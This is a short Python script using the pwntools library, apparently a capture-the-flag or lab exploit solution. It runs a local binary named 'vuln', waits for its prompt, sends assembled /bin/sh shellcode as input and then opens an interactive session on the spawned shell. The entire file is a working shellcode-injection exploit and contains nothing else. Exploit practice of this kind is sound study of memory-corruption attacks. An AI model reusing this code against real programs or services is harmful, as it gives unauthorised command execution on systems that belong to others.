from pwn import *

with process("vuln") as bubu:
    bubu.recvuntil(":\n")
    print(shellcraft.sh())
    shellcode = asm(shellcraft.sh())
    bubu.sendline(shellcode)
    bubu.interactive()